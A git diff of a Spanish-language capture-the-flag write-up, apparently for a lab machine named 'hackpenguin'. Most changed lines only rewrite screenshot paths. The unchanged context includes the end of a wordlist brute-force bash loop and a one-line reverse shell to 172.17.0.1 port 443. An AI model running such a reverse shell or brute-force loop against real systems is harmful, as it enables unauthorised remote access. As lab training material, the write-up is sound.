@@ -1,16 +1,16 @@
-![](images/images-hackpenguin/Pasted%20image%2020250309180419.png)
+![](Pasted%20image%2020250309180419.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250309180525.png)
+![](Pasted%20image%2020250309180525.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250309180709.png)
+![](Pasted%20image%2020250309180709.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250309180827.png)
+![](Pasted%20image%2020250309180827.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250309180910.png)
+![](Pasted%20image%2020250309180910.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250309183320.png)
+![](Pasted%20image%2020250309183320.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250310133216.png)
+![](Pasted%20image%2020250310133216.png)
 
 Con esto el comando nos muestra su respuesta stderr, buscaremos un stdout con fuerza bruta:
 
@@ -53,22 +53,22 @@ done < "$wordlist_file"
 echo "[+] Proceso terminado."
 ```
 
-![](images/images-hackpenguin/Pasted%20image%2020250310142121.png)
+![](Pasted%20image%2020250310142121.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250310152709.png)
+![](Pasted%20image%2020250310152709.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250310152735.png)
+![](Pasted%20image%2020250310152735.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250310153810.png)
-![](images/images-hackpenguin/Pasted%20image%2020250310155200.png)
+![](Pasted%20image%2020250310153810.png)
+![](Pasted%20image%2020250310155200.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250310155957.png)
+![](Pasted%20image%2020250310155957.png)
 
 ``` bash
 echo -e 'pinguino hackeable' > archivo.txt; bash -i >& /dev/tcp/172.17.0.1/443 0>&1
 ```
 
-![](images/images-hackpenguin/Pasted%20image%2020250310161517.png)
+![](Pasted%20image%2020250310161517.png)
 
-![](images/images-hackpenguin/Pasted%20image%2020250310161547.png)
+![](Pasted%20image%2020250310161547.png)
 
